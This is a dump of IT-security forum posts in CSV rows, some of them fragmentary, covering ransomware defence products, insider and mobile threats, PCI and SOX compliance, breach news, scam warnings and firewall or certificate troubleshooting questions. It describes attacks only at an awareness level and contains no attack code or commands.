haven't changed anything.Anyone experienced anything similar? What could this be?. Virus/Permissions/Anything else? PLEASEEEEEM HELP",0

The reality is that there is security in the cloud and for the cloud, and both offer interesting perspectives. Having security in the cloud allows for more effective and faster threat protection. Having security for the cloud means you are actively monitoring it and the service, making sure your data is protected. There have been several new advances in combating security challenges inherent the growth of cloud adoption that we will be discussing in a webcast.﻿What are some challenges you faced when you moved to the cloud?

1526811,Prevent ransomware from messing up your file share,"Seems the world's gone crazy and there’s no place to hide from the ransomware. It avoids signature detection (surprise in 2016, right?), its encryption is almost always unbreakable, it does not necessarily has to have administrative rights to cause damage, it affects files stored on the network shares, it disables restore points, removes shadows copies, tracks down and wipes your backups.We’ve had a great preventive solution for a while that not only detects ransomware at the stage of infection, but also if made a mistake and let it run, would still catch the malicious behavior, block the action and roll back the malicious changes. More info on this here:System Watcher moduleCryptomalware countermeasures subsystem""What is a cryptovirus and how can it jeopardize your business?﻿"" video:https://www.youtube.com/watch?v=V_PGnouFs44﻿There were a few scenarios where this protection wouldn’t actually help. And probably the worst (at least judging by never ending flow of posts on Spiceworks) is when you have a network share and suddenly an infected machine on the network starts encrypting the files on this share. Even if you were to monitor the server itself, there’s nothing to detect – the server itself is not infected, so you can scan the memory and files and the share all you want – the malware will keep doing its job probably laughing hysterically looking at your desperate attempts to prevent the damage.This exactly is the scenario that we tried to address with the new update of Kaspersky Security for Windows Server (ex. Kaspersky Security for Windows Server Enterprise Edition; yes, we changed the name too, because why not). What the new version of the application does, is it monitors the activity on the share and in case it believes that a machine is running a malicious activity on the share (read: encrypts your company data), it will block that machine from accessing the server for 30 minutes and notifies the administrator﻿ (so you actually don’t have to unplug all the machines and plug them one by one to identify the infected one.https://youtu.be/r8OV3x-L5Wo﻿Again, think about it – there’s nothing on the server, it is not infected, and yet the damage can be done and we will prevent that. Magic you say? I tend to agree with you, we are that awesome. In addition to that, we bring in integration with Kaspersky Security Network as well as application startup control to the Windows Servers (executables, MSI packages, scripts and DLLs – policies for startup can be configured automatically or manually).This functionality is available for our customers who is purchasing or has an active license for one of the products:Kaspersky Endpoint Security for Business Select (no Application Startup Control)Kaspersky Endpoint Security for Business Advanced﻿Kaspersky Endpoint Security for Business TotalKaspersky Security for File ServerKaspersky Security for StorageJust to wrap up – remember about multi-layered approach to security. Backup religiously. Stop the phishing at your email server or web browser. Stop the known malware (signatures are the cheapest way to do so, so show them some love, too). Check with cloud intelligence. Let it boil a little in a sandbox. Let your firewall do some job for you. Make sure application privilege control stops applications accessing your personal data unless explicitly allowed. Or go all the way and switch to Default Deny mode. Monitor the processes your allowed to run for exploitation attempts and malicious activities. Roll back malicious changes if anything else failed. Make sure every node on the network is protected – be it proxy server, mail server, SharePoint server, storage device or a file server – you don’t want malicious payload sitting on your network waiting to be assembled and launched by a malware. Stay safe.﻿UPDATE: I'm receiving question in PM and I thought I'd share answers - I'll be editing this post to add QnA as they come inQ: Do I have to use Kaspersky product on workstation?A: No, you can simply install the Kaspersky Security for Windows Server on your Windows-based file server and it will be protectedQ: Do I have to deploy Security Center to manage Kaspersky Security for Windows Server?A: No, you can also manage it locally on the FS through MMCQ: Who do I contact to get the protection?A: Send an email to corporatesales@kaspersky.comQ: Datasheet available?A: Please see it attached to this postQ: I'm a Kaspersky business customer...A: You are most probably already licensed for this functionality!Q: Knowledge base, system requirements, installation & admin guides, distros, etc...A: http://support.kaspersky.com/ksws10﻿Q: Trial version?A: Free 30-day trial: http://usa.kaspersky.com/business-security/free-trials/total﻿",11

1214672,How to identify and react to insider threats,"Studies show that employees are an organization's biggest threat to security. Even though we know this, we have a tendency to think that ""we hire trustworthy people, so we won’t have a problem﻿,"" or ""we’ve never had an insider attack, so we must be doing OK.""﻿ But CSO cites a number of cases where people actively work against the organizations that hired them – moles, disgruntled employees, and hacktivists﻿ among them. The article suggests starting with a least-privilege, zero-trust approach﻿, but that's not enough to stop users who have elevated privileges because they need them to do their jobs. SpectorSoft COO ﻿Mikey Tierney suggests using user behavior analytics, which ""apply behavioral baselines to identify attacks based on employee actions that deviate from normal, established behavior patterns. These tools can detect anomalous activity and alert the organization in a timely manner, prompting manual or automated remediation responses.﻿"" He also says organizations ""should maintain insider incident response plans that define the response, which should include an extended response team due to the fact that an employee is involved﻿."" The team should include representatives from human resources, legal, and IT departments.Have you ever had to deal with a malicious insider?              ",1

2098435,5 Mobile Security Threats to Keep an Eye on in 2018,"Original article found on IDGConnect.Mobile security is at the top of every company's worry list these days — and for good reason: Nearly all workers now routinely access corporate data from smartphones, and that means keeping sensitive info out of the wrong hands is an increasingly intricate puzzle. The stakes, suffice it to say, are higher than ever: The average cost of a corporate data breach is $21,155 per day, according to a 2016 report by the Ponemon Institute.While it's easy to focus on the sensational subject of malware, the truth is that mobile malware infections are incredibly uncommon in the real world — with your odds of being infected significantly less than your odds of being struck by lightning, according to one estimate. That's thanks to both the nature of mobile malware and the inherent protections built into mobile operating systems.The more realistic mobile security hazards lie in some easily overlooked areas, all of which are only expected to become more pressing in the coming year:1. Data leakageIt may sound like a diagnosis from the robot urologist, but data leakage is widely seen as being one of the most worrisome threats to enterprise security as we head into 2018. What makes the issue especially vexing is that it often isn't nefarious by nature; rather, it's a matter of users inadvertently making ill-advised decisions about which apps are able to see and transfer their information.""The main challenge is how to implement an app vetting process that does not overwhelm the administrator and does not frustrate the users,"" says Dionisio Zumerle, research director for mobile security at Gartner. He suggests turning to mobile threat defense (MTD) solutions — products like Symantec's Endpoint Protection Mobile, CheckPoint's SandBlast Mobile, and Zimperium's zIPS Protection. Such utilities scan apps for ""leaky behavior,"" Zumerle says, and can automate the blocking of problematic processes.Of course, even that won't always cover leakage that happens as a result of overt user error — something as simple as transferring company files onto a public cloud storage service, pasting confidential info in the wrong place, or forwarding an email to an unintended recipient. That's a challenge the healthcare industry is currently struggling to overcome: According to specialist insurance provider Beazley, ""unintended disclosure"" was responsible for a full 41 percent of data breaches reported by healthcare organizations in the first three quarters of 2017 — more than double the next highest cause.For that type of leakage, data loss prevention (DLP) tools may be the most effective form of protection. Such software is designed explicitly to prevent the exposure of sensitive information, including in accidental scenarios.2. Social engineeringThe tried-and-true tactic of trickery is just as troubling on the mobile front as it is on desktops. Despite the ease with which one would think social engineering cons could be avoided, they remain astonishingly effective.A staggering 90 percent of data breaches observed by Verizon's Enterprise Solutions division are the result of phishing, according to the company's 2017 Data Breach Investigations Report. While only 7 percent of users fall for phishing attempts, Verizon says, those gullible guys and gals tend to be repeat offenders: The company estimates that in a typical organization, 15 percent of users who are successfully phished will be phished at least one more time within the same year.What's more, numerous bits of research suggest users are more vulnerable to phishing from mobile devices than desktops — by as much as three times, according to an IBM study, in part because a phone is where people are most likely to first see a message. ""We do see a general rise in mobile susceptibility driven by increases in mobile computing overall [and] the continued growth of BYOD work environments,"" says John ""Lex"" Robinson, information security and anti-phishing strategist at PhishMe — a firm that uses real-world simulations to train workers on recognizing and responding to phishing attempts.Robinson notes that the line between work and personal computing is also continuing to blur. More and more workers are viewing multiple inboxes — connected to a combination of work and personal accounts — together on a smartphone, he notes, and almost everyone conducts some sort of personal business online during the workday. Consequently, the notion of receiving what appears to be a personal email alongside work-related messages doesn't seem at all unusual on the surface, even if it may in fact be a ruse.3. Wi-Fi interferenceA mobile device is only as secure as the network through which it's transmitting data. In an era where we're all constantly connecting to public Wi-Fi networks, that means our info often isn't as secure as we might assume.Just how significant of a concern is this? According to new research being released by enterprise security firm Wandera this week, corporate mobile devices use Wi-Fi almost three times as much as they use cellular data. Nearly a quarter of devices have connected to open and potentially insecure Wi-Fi networks, and 4 percent of devices have encountered a man-in-the-middle attack — in which someone maliciously intercepts communication between two parties — within the most recent month.""These days, it's not difficult to encrypt traffic,"" says Kevin Du, a computer science professor at Syracuse University who specializes in smartphone security. ""If you don't have a VPN, you're leaving a lot of doors on your perimeters open.""Selecting the right enterprise-class VPN, however, isn't so easy. As with most security-related considerations, a tradeoff is almost always required. ""The delivery of VPNs needs to be smarter with mobile devices, as minimizing the consumption of resources — mainly battery —  is paramount,"" Gartner's Zumerle points out. An effective VPN should know to activate only when absolutely necessary, he says, not when a user is accessing a news site, for instance, or when a user is working within an app that's known to be trustworthy and secure.4. Out-of-date devicesSmartphones, tablets and smaller connected devices — commonly known as the internet of things (IoT) — pose a new risk to enterprise security in that unlike traditional work devices, they generally don't come with guarantees of timely and ongoing software updates. This is true particularly on the Android front, where the vast majority of manufacturers are embarrassingly ineffective at keeping their products up to date — both with operating system (OS) updates and the smaller monthly security patches between them — as well as with IoT devices, many of which aren't even designed to get updates in the first place.""Many of them don't even have a patching mechanism built in, and that's becoming more and more of a threat these days,"" Du says.Again, a strong policy goes a long way. There are Android devices that do receive timely and reliable ongoing updates. Until the IoT landscape becomes less of a wild west, it falls upon a company to create its own security net around them.5. Physical device breachesLast but not least is something that seems silly but remains a disturbingly realistic threat: A lost or unattended device can be a major security risk, especially if it doesn't have a strong PIN or password and full data encryption.Consider the following: In a 2016 Ponemon Institute study, 35 percent of professionals indicated their work devices had no mandated measures in place to secure accessible corporate data. Worse yet, nearly half of those surveyed said they had no password, PIN, or biometric security guarding their devices — and about two-thirds said they didn't use encryption. Sixty-eight percent of respondents indicated they sometimes shared passwords across personal and work accounts accessed via their mobile devices.The take-home message is simple: Leaving the responsibility in users' hands isn't enough. Don't make assumptions; make policies. You'll thank yourself later.Considering how many of you work in the cybersecurity field, do you agree with this list? Any other threats that should be added? ",12
124791,Network Appliance and PCI,"Heres a little scenario that I wanted to throw out there and get an opinion on by someone who knows PCI. I am starting to learn but couldn't help with this problem because I've never assisted in a PCI audit... (I would think this problem has been encountered by many small companies that make network appliances)====== Background =======1) Company A is a small company (only 5 employees)2) They provide a service which requires their customer, Company B, to install a small network appliance on their LAN in order to collect data from their onsite mechanical equipment.3) Operating data is then pulled from these mechanical systems and then dumped to a remote server which processes the data and provides a dashboard for the customer to view (via SSL).4) Company B bought a license for this service and was also handed over the keys to administer accounts and decide which employees it would like to give access to.5) Now let’s say that Company B typically processes credit card payments locally and sends transaction data through their local LAN on its way out to their payment processor.====== Problems =======1) Company A does not take credit cards and is not required to be PCI compliant however they do provide a service which requires their network appliance to be installed on Company B’s network.2) In recent days Company A has come to the conclusion that in some of Company B’s newly acquired satellite offices, credit card data is being forwarded across the LAN in a variety of ways (some of which do not look to be secure/encrypted).3) In addition, several of these satellite offices are running consumer grade routers (ie: Linksys, Netgear) providing little in the way of segmentation.4)Company A would like to avoid being “In Scope” and having to charge the client for consulting fees.====== Questions =======1) For the smaller satellite offices what might be a simple fix?2) Does segregation provide an easy way to kick devices out of scope for PCI audits?3) Would it be recommended/possible to have a firm produce a report which could be handed to an auditor and prove “Out of Scope” prior to being dragged into one of these audits?4) Could the network appliance be designed/situated in such a way as to be “out of scope” or at least easily verifiable as compliant even if it was sitting on the same logical subnet where the card data traffic was moving across?",0

1726345,Network under attack at WAN - What Action do you take,"I have been working in customers Sonic Wall TZ-215 trying to get some automated email for Alerts. (Topic - IDS and Alerts) Thought maybe better to start a separate topic for this. I am still trying to figure what Alerts should be considered as dangerous enough to take defensive action. From what I understand when I see the Alert in the log or email it is telling me that - IP X.X.X.X - Public tried to hit my WAN-IP X.X.X.X and was denied or IP X.X.X.X Public ran a Port Scan on my 192.x.x.x inside pc. So to me that says the Sonic Wall is doing it's job. But we have auditors wanting to know our plan of action when we get such alerts. For now I have a Rule in the Fire Wall for Deny and a Address Group that I add an Address Object of the Public IP or entire range to, which then Blocks that IP. I don't really think that is any safer as the SW was already Blocking it. But I have an answer to the auditors when ask ""what did you do"" .This could be a never ending cat-mouse chase trying to add all the IP and I feel sure at some point the Sonic Wall will reach a limit of how many address Objects I can have.So I am asking what do you consider a Dangerous Attack?

2103531,Cybersecurity Reality Check: Not just paranoia,"I know that this will likely be debated until the end of time. On one side, we've got the tinfoil hats like me. On the other side, you may hear folks dismissing concerns as paranoia.Our researchers wanted to dig deeper into this, so we polled SMBs and their employees on a variety of topics, such as:Are you concerned about malware/viruses/ransomware? (96% were)Are you concerned about mobile device security? (91% were)And so on.Our findings were interesting, as for example not everyone polled was concerned about problems with artificial intelligence (46% were) but those polled were universally concerned with viruses and ransomware.Also, the team compared the results of the poll to dozens of articles and statistics from around the web, to gauge whether the concerns were unfounded, or could easily be matched up to what's happening in the real world. Spoiler alert: in most cases, we're not just paranoid.I wanted to share this with everyone as it's very detailed and includes tons of links, statistics, and quotes from a variety of sources spanning each security topic, like the example above.Read the full article on the Avast blog.",0

706988,Here Are The 2015 Top 10 IT Security Predictions - Feedback requested!,"Guys, this is going to be published in CyberheistNews coming Tuesday.  Am I overlooking something? Going overboard? Am I nuts? Comments please? :-D1) The Sony hack is a harbinger for more nation-state attacks on private sector organizations. Expect a successful cyber attack on a U.S. energy infrastructure company causing a blackout in a major city,and Iran, DPRK, China or Russia being blamed.2) The Internet of Things (IoT) will grow 30% and one of these devices will get infected with ransomware, demanding Bitcoin micropayments.3) The Financial- and Defense Industry have doubled their IT security budgets in 2014, and during 2015 several other sectors will follow their example, specifically Technology, Manufacturing, and Government.4) Breach detection tools are now making their way into the enterprise, but correctly responding to a data breach is still very hard. Count on a Sony-like chaos-and-panic response from a major healthcare organization driving it out of business.5) With the event of renewed interest in mobile payment, cybercrime's attention will get focused on this lucrative combo of ""mobile & money"". I'm predicting Apple Pay will be compromised somehow in 2015, and that a new Apple-specific ransomware will spread via phishing attacks on iPhones, targeting cloud accounts.6) In 2015 we will finally see an international initiative and tools that allow security information to be shared in an effective crowdsourcing format so that it will be harder for hackers to be successful.7) We have not seen the end of POS attacks, but since retailers are going to harden the POS endpoints, cyberheists will move to ""middle layer"" targets which means payment processors and third-party POS management infrastructure.8) One of the major companies that was infected in 2014 will not move fast enough to shore up their security infrastructure, and will get reinfected in 2015, resulting in again losing millions of credit cards. Consumers will have gone into deep breach-fatigue and dismiss the risk.9) Board Rooms will realize that culture trumps compliance and start top-down security culture initiatives, assisted by technology-driven ethics and compliance programs.10) 2014 saw a 650% increase in social media spam and 99% of these malious URLs led to malware or phishing sites.

668163,"Hidden ATM Card ""Skimmer"" Discovered","Always paranoid of ATMs, this makes me even more so...http://www.msn.com/en-us/news/technology/new-atm-skimmers-connect-to-the-card-reader-via-a-nearly-in...﻿A new advance in credit card theft technology has hit the streets and it’s pretty clever. The ATM hackers are now drilling a small hole near the card reader and inserting a bit of electronics that connects to the ATM’s innards. The hole is then covered by a decal and the skimmer fished out once the thieves are ready to take in their haul.Discovered by the European ATM Security Team, the new skimmers are not physically attached to the outside of the machine and instead are hidden inside, out of sight. Writes Brian Krebs:""I sought clarification from EAST about how the device works. Most skimmers are card slot overlay devices that work by using a built-in component which reads the account data off of the magnetic stripe when the customer inserts the card. But Lachlan Gunn, EAST’s executive director, suggested that this device intercepts the card data from the legitimate card reader on the inside of the ATM. He described the wiretapping device this way:“It’s where a tap is attached to the pre-read head or read head of the card reader,” Lachlan said. “The card data is then read through the tap. We still classify it as skimming, but technically the magnetic stripe [on the customer/victim’s card] is not directly skimmed as the data is intercepted.”Thieves still have to use hidden cameras to steal user PIN codes, a fact that is key in preventing credit card theft. Hiding the PIN pad with your free hand is imperative no matter where you are. I also tug on the various parts of the ATM before I slide my card but, as we’ve just learned, that doesn’t always help.",0

It's going to be for a very limited number of users, mostly execs, upper management, and IT personnel.As a pseudo-2FA higher assurance security I am attempting to set up the workstation authentication certificates to be stored in the TPM module, and then bitlocker encrypt the drives.The users that would be considered eligible all have SSDs so I'm not concerned about performance hits due to full drive encryption with bitlocker.There are various guides out there on how to set up a ""Workstation Authentication"" template that uses the TPM, and requires key attestation, and I've had no problems setting that part up. I've got the template set up, I've set up the correct permissions on that template so only a specific security group of computers can read or enroll for the template.I've got a test machine, with TPM enabled and activated, it's in the correct security group and so when I run certlm.msc and run the enrollment process, I see the template I've created, but when I hit enroll I keep running into the error message below.Googling the error doesn't give me any good answers. I've cleared and reset the TPM on this test machine twice and the same error persists. This test device has our internal CA root certificate in the correct location, and I can enroll for other internal certificates without issue. What am I doing wrong? What does this error mean and where should I look?",0

152812,Very Strange Virus/Malware Attack,"G'day All,Just want to relate something I encountered the other night and see if anyone has seen this before. Might also serve as a heads up as well.So my girlfriend was working on her laptop the other night when she tells me it just rebooted for no reason. I go and have a look, she's able to login but at this point a full screen written in German comes up and you cannot access the OS. My German is not fluent but the crux of it was you pay us some $$$ and we provide you with an unlock code for your OS.Not wanting to make some scumbag richer I tried fixing it. Disconnected from the Net, rebooted and went into Safe Mode....same result. In the end I fixed it by using a system restore point from a few days previously. Was able to get in and ran a full scan....Negative.I should point out this laptop is Win 7 Home Pro, is always updated, has the McAfee Security Suite installed (also updated) and dosen't go to dodgy sites (at least not that I'm aware of).So has anyone seen this before? Suffice to say I will be changing the security suite on the laptop. I e-mailed McAfee Support, who were helpful but largely no help.Cheers ",0

583043,Home Depot Hit By Same Russian Hackers As Target,"Right after the Target Hack, C-level execs at Home Depot Inc. put together a task force to prevent being the victim of a similar attack. The task force recommended to fully encrypt payment card data at the chain's 2,200 stores, but it wasn't until many months later that they started the work.You could ask yourself how could this happen, with the Target hack fresh in mind?The reason is that they thought they could defend against a hack like this, and apparently gave the wrong priority to the the possibility they already had been breached. Instead of prevention, they should have focused on detection of the existing breach and getting the hackers out of their network. OK, hindsight is 20-20, but in this case it should have been obvious. The data breach is very similar to the breach at Target.  The malware used to steal card data from Home Depot had the same code base as the tool used against Target, people who analyzed the code said. (The data is generally vulnerable in the brief moment it passes into the system's memory after the card is swiped.) After analyzing the malware, it was found that in both the code had Russian words in it.Russian President Vladimir Putin allows cybercrime to continue, because he considers it a resource and now and then tells them to attack a country that is bothering Russia in some way. Imagine, cyber mafia as shock troops for the Russian government. Draw your own conclusions.It would not surprise me if they got in the same way they got into Target, spear-phishing one of the Home Depot vendors.

1351315,Scam Of The Week: Comcast Triple Threat,"  ﻿You are probably aware that Comcast is the largest home ISP in the U.S. and that they also have many thousands of business users. No wonder they are the target of a sophisticated social engineering attack. You can count on other ISPs soon being attacked the same way, so this is something you need to warn your users about. Here is the triple-threat scam which was discovered by our friends at Malwarebytes:  Comcast has a search page called Xfininity that serves tons of searches. On this page is a malicious ad (served by Google) from ""Sat TV Pro"" which claims to compare Direct TV to Comcast TV. The user clicks and gets redirected to a compromised site which has an Exploit Kit (EK) running.The EK infects first the workstation with ransomware and then redirects to a fake Xfinity site.The fake Xfinity site pops up a message from ""Comcast's security plugin"" that the workstation is infected (correct, the bad guys just did that!) and that the user needs to call tech support. The toll free number goes to scammers who will try to charge the user's credit card to ""fix"" the box.﻿Dang, they get craftier by the month with these ""double payloads"" where social engineering, exploit kits, and ransomware are combined. If they don't get you one way they will try to get you the other way. This is a good example of cyber crime gangs cooperating and sharing ""revenues"" because the toll-free scammers are unlikely to be the same guys as the ransomware team. If you want the technical detail, you can see the flow of the scam at the Malwarebytes blog. This particular scam was reported to Google and Comcast, but there will be other scams very similar to this one. The bad guys have whole campaigns stacked up with attacks like this, and it's like whack-a-mole. So I would send the following to your users. Feel free to copy/paste/edit this Scam Of The Week and send it to your employees, friends and family.""More and more, legit-looking advertising served on major websites turns out to be malicious. Bad guys pay for and posts ads that they hope you will click on. But if you click on those ads, you get redirected to a compromised website. That malicious site might infect your computer with ransomware, and/or display popups that claim your PC has a virus and tell you to dial a toll-free number. If you call that number it will be answered by scammers who claim they are Microsoft but will try to charge your credit card to fix your computer.

Use Fortigate alone.That would require installing agents on all DCs and terminals.2. Buy Sophos UTM.It can join the domain, and see the users and group in your domain.These two options didn't help with my special routing needs.Also, agents on my DCs and every terminal are no go...3. I suggested using multiple TinyProxy VMs (or whatever) so we can create a GPO per group, and a rule in the Fortigate per TinyProxy IP.With this I can even do sort of routing-per-group.The problem is logging - I won't see the client IP in my Fortigate anymore, only the proxy's.Tracking down issues would be a headache.4. Some vendor also offered to buy WebSense, but I've no idea if it can do the routing-per-group thing (not to mention the pricing).I could combine two of the options, but I don't think that would help much.Any suggestions?Thanks.",0

The second step of the attack, the bad guys try to get the user to give out the information they miss to completely take control of the account. They use a a bogus security check form, and ask for the answer to a security question. It is obvious that the bad guys are targeting specifically HR departments for two reasons:Take over their workstations, penetrate the HR software and implant phantom employees so that they can cash in on payments to these fake employees that were set up. If the account is tied to a bank account and has a spending budget, it's a target for banking TrojansPeople in HR that use Monster and CareerBuilder should keep an eye out for Red Flags related to these websites and do some effective security awareness training.

371647,TrueCrypt system partition - inaccessible boot device,"I have a system with 4 2TB drives set into 2 raid 1 volumes. 1 volume is the system drive and the other for data.

The real ip of RTR1 is 172.16.23.126 and RTR2 is 172.16.23.125 and the Virtual IP is 172.16.23.1So here comes the fortigate, both are in transparent mode. With same configurations but only differs with hostname and management ip. FW1 is 172.16.23.5 and FW2 is 172.16.23.6. They have a default route having the next hop to 172.16.23.1 (Virtual Gateway).As with the diagram, FW1 is connected with RTR1, and FW2 is connected with RTR2.So I have a policy of from local interface (int7) going to wan interface (wan2) for internet access. And also I have a policy for the local network to have a connection with the head office, this is where they get their DNS, which are 172.16.200.10 and 172.16.200.11On my internet policy I use webfilter profile blocking some sites. When the user goes to the FW1, site to not allowed are blocked, but when they go to FW2 sites are still allowed due to that on both firewall webfilter policy I checke “allow websites when rating occurs”. Then everytime I tried to rate a website using FW2 it says “Rating Error”.I think this is regarding on fortiguard connection right? But why is it thay both FW have same DNS and same in anything else, and also both Routers are same also, why is it only on FW2 we encountered this error. (FYI they have the default DNS of FortiGate unit which are 208.91.112.198  and 208.91.112.194)I already tried changing the DNS of FW2, using 8.8.8.8 and 4.2.2.2, and also using 172.16.200.10 and 172.16.200.11 but nothing changes.

What kind of systems do you run and are they single devices/systems or do you have a layered approach from multiple vendors and if so do the multiple systems give you grief without a unified platform?I was trying to find the right information that conveyed what we had was insufficient. I read this very interesting page on SANS.edu ""Common Network Security Misconceptions: Firewalls Exposed"" that really seemed to inform decision makers who think they are safe from the evolving threat landscape with old and out dated systems. I really liked this part in the Abstract.Abstract: As the commercialization of the Internet enters its third decade, the Web itself has evolved from sharing static information to driving dynamically connected mission-critical applications. While web applications and efficiencies of Web 2.0 are universally adopted, network security practices often still rely too heavily on the basic network firewall to block access to static information. Too many enterprises today believe their firewalls deliver ""good enough"" security to mitigate Internet-related threats and attacks. However, enterprises that do not currently have advanced network protection deployed face significant risk and are likely already compromisedThe entire brief can be read here... http://www.sans.edu/research/security-laboratory/article/pirc-john-firewalls",5

The domain name was registered through eNom in April 2017, 14th, and resolves to a shared web host at namecheap. When logged in, members can browse the Prices page and purchase a premium subscription for 1, 3 or 6 months through Selly. Members download the same archive of the free installer than guests which you can find details of in the original write up.  Additionally, it is noted that we don’t know if the private installer of the hack also installs the mining software without user consent.Now, if interested you can see the detailed analysis of the ""vHook"" installer and ""helper"" miner downloader dropper in the author's full post. But as mentioned in the write up, we didn’t spend too much time reverse engineering [vhook.dylib]. The source code is available on GitHub and videos of the hack are also available on YouTube here and here. GitHub owner of the vHook project is fetusfinn (original author is ViKiNG) and we coincidentally found debugger symbols matching Finn username in GitHub’s [libvHook.dylib] and in all analyzed binaries. This is how we know Finn’s project name is ""pwnednet"".

If you want to look at a piece of Flash content that was paused, you can click on it and start it manually.The change, originally announced in June and enabled for beta users, goes into effect for everyone Sept. 1, Google announced Thursday.The feature already exists in Chrome; you can turn it on in the browser's ""Advanced settings,"" under ""Content settings,"" by choosing the ""Detect and run important plugin content"" option. The change going into effect Sept 1. will be that this feature will be turned on by default.The new option should speed up page loading and reduce Chrome's memory (over)consumption, which is a growing problem for Google's web browser.For those wanting to go a step further, try a Chrome plugin called The Great Suspender, which completely disables unused Chrome tabs until you choose to re-enable them.As for Flash, the change in Chrome's behavior is just another cut that's making the security-flaw-ridden platform less relevant and, hopefully, soon obsolete.﻿http://mashable.com/2015/08/28/google-chrome-autopause-flash/﻿One small step for security, one giant leap for mankind﻿.",12
680338,Multi-Factor Authentication solutions for home/one user over multiple devices,"I like Lastpass. I like RSA's SecureID (but they are expensive and expire). Star Wars The Old  Republic offers a MFA key, as does Sony Online Entertainment, and PayPal. Bank of America once also offered a credit card sized Secure ID.Then there is the Microsoft MFA for Android and the Google Authenticator for Android.I would like to easily and without large costs provide my desktops, laptops, tablets, smartphones, and even specific applications (like Lastpass, PGP, GPG, browsers, site-specific browser logins) with a good single MFA product.I am tired of the VISA/MC/AmEx method of printing a code on the very card that may be lost or stolen. I am tired of providing any part of my SSN or driver license. I am tired of random 'secret questions'. The common item appears to be that Smartphones have micro or mini USB connectors, and most desktops and laptops have full size USB connectors. That leaves tablets and application specific solutions.What should I begin with? I use currently PGP, Lastpass, Google Authenticator, Microsoft's MFA for Android, the SWTOR keys, the SOE keys, and the PayPal keys.I always feel I'm 20 years ahead of my time, but my debit cards were picked off at least 4 times in one year.

1978593,"Ransomware Is Skyrocketing, But Where Are All The Breach Reports?","More than 4,000 ransomware attacks occur daily and healthcare is the largest target. However, despite disclosure requirements and the risk of late or no HIPAA notification at all, breach reporting simply doesn’t match up.I found some interesting data in a new survey by Healthcare IT News and HIMSS Analytics that showed more than half of hospitals were hit with ransomware from April 2015 to April 2016, but breach reporting to the OCR was practically non-existent.The Office for Civil Rights (OCR) is an organization within the U.S. Department of Health & Human Services (HHS). Under the Health Insurance Portability and Accountability Act (HIPAA), the OCR can levy significant fines to health care providers and their business associates if personal health information is lost or stolen. As ransomware attacks have increased, one would expect OCR breach reporting to have increased more or less concurrently, but only nine (!) organizations reported malware or ransomware breaches to OCR in 2016.""Because ransomware is so common, hospitals aren't reporting them all,"" said ICIT Senior Fellow James Scott. ""And ransomware is just the start for more specific actors to send in another attack and start mapping the system."" Four Reasons Why Breaches Do Not Get ReportedThere are four major reasons hospitals don't report breaches, said ICIT's Scott. To start, there's a fear of the economic impact and liability resulting from having to admit an organization has put thousands or millions of unsuspecting patients at risk for a lifetime of being exploited by criminals.Further, many employees, from executives to entry-level personnel don't want to admit to administration or to the IT team they fell for a social engineering scam. As a result, these employees don't report their mistake.Another major issue is that an investigation can disrupt business operations. Not only that, but investigators ""poke holes in examined networks and publicize the vulnerable network that, in all likelihood, is already pulsating with scores of adversaries, who have been exfiltrating data all along,"" Scott said.""Negative publicity harms reputation and diminishes deniability, thereby making the victim organization more liable in future cyber-incidents,"" Scott explained. ""Nowadays, if a health sector organization is only hit with ransomware, they can consider themselves lucky and perhaps those are the breaches that we hear about.""You have 60 Days To ReportThe 60-day timer starts the moment a breach is discovered, which is the first day the covered entity knew about the breach. And it applies to all staff within the organization. For example, when someone at the help desk learns about a breach, the timer starts then – even if it takes a week for the incident to be reported to higher staff, according to Erin Whaley, a partner at Troutman Sanders in Richmond, Virginia.""However, many healthcare organizations remain non-compliant out of calculated non-compliance (the fine is cheaper than the reporting costs and impact) or out of lack of resources (they cannot afford the technical controls, contractors and other needs to investigate incidents to HHS satisfaction,"" he added. ""Considering that some hospitals are seeing 20 or more ransomware attacks per day, hesitance to report out of fear or reputation loss or lack of resources, is not surprising.""Especially interesting if you are in Healthcare IT, but recommended reading if you are required to report data breaches when ransomware infects your network, and excellent ammo for more IT security budget.http://www.healthcareitnews.com/news/ransomware-rising-where-are-all-breach-reportsWhitepaper Download: Legal Compliance Through Security Awareness TrainingThis whitepaper from Michael R.

1248557,3 Tips for Maintaining SOX Compliance in 2015,"If you run a public business in the United States, you are required to comply with the Sarbanes-Oxley Act (SOX). This piece of legislation was implemented to improve the accuracy of corporate disclosures and protect shareholders and the general public from the security threats of accounting errors and fraudulent activity in enterprise businesses.While SOX does not set specific standards for storing electronic information, it does define which records should be stored and for how long. The consequences that come with not maintaining SOX compliance can include major fines, imprisonment, or both, as we’ve seen in violations with AIG Insurance’s $10 million 2006 fine and even more recent violations shared through SEC press releases. While SOX explicitly refers to public companies, private companies would do well to monitor and comply with SOX to plan for future growth and development. A lack of compliance can delay the acquisition and exit process and negatively affect stock prices when a company goes public. SOX was enacted in 2002 and goes by two other names; in the Senate, it is known as the Public Company Accounting Reform and Investor Act, and in the House of Representatives, it is known as the Corporate and Auditing Accountability and Responsibility Act. The rules and deadline requirements of SOX affect the financial and IT sides of an organization and are administered by the United States Securities and Exchange Commission (SEC). Compliance with SOX is regulated by three rules within Section 802 of the Act regarding the management of electronic records.These rules govern the destruction, alteration, and falsification of records; the retention period for those records; and the type of records that need to be stored. SOX compliance audits rely on effective and efficient internal processes and controls. Abiding by these rules and requirements ensures the accuracy, accountability, and reliability of the information a company discloses. Companies looking to achieve and maintain SOX compliance are advised to consider the following principles:1. If you manage a private company, consider the SOX rules that already apply to your organizationPrivate companies don’t get a pass on m any SOX compliance factors, even though they technically apply only to public companies; other laws guarantee similar penalties for retaliation against whistleblowers and destroying or tampering with documents. Other laws also extend to bankruptcy, the statute of limitations for securities fraud, and penalties for mail and wire fraud. It’s in your interest to understand and abide by SOX to benefit from compliance you are already maintaining.2. Use common sense and act with the company’s interests in mindSOX violations often underscore a lack of best practices and integrity within an organization. By identifying and minimizing conflicts of interest, acting on an informed basis, and using the insight of experts, companies and board members can avoid the consequences that come with SOX violations.3. Automate your IT complianceSustainable compliance starts with automation. Not only are systemic reports likely to be accepted as audit evidence, but removing the human element of the reporting process will increase your overall consistency and preparedness no matter when an audit takes place.4. Use the resources available to you to proactively audit your businessThe SEC has a number of resources available to help small businesses self-audit for SOX compliance and develop an information system that com plies with industry best practices. Click here to review the evaluation process. True SOX compliance requires a unified approach to strategic, integrated business practices that put the protection and storage of electronic data first.

